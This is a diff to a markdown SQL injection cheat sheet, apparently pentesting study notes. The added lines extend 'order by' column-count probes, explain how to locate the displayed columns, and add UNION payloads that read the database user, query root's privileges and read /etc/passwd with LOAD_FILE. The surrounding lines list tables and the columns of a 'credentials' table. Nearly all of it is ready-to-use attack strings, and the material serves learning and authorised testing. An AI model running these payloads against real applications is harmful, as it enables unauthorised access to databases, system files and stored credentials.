@@ -16,6 +16,12 @@ select * from logins where (username = 'admin' and id > 1) and password = 'admin
 Determine the column number
 ```
 ' order by 1 -- -
+' order by 2 -- -
+' order by 3 -- -
+```
+Determine the Location of Injection
+```
+While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:
 ```
 >Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
 
@@ -32,6 +38,14 @@ cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES wher
 Enumerate column names from table
 ```
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+Read Files
+```
+cn' UNION SELECT 1, user(), 3, 4-- -
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 ```
 ### Blind Sql Injection
 ###### Time-Based
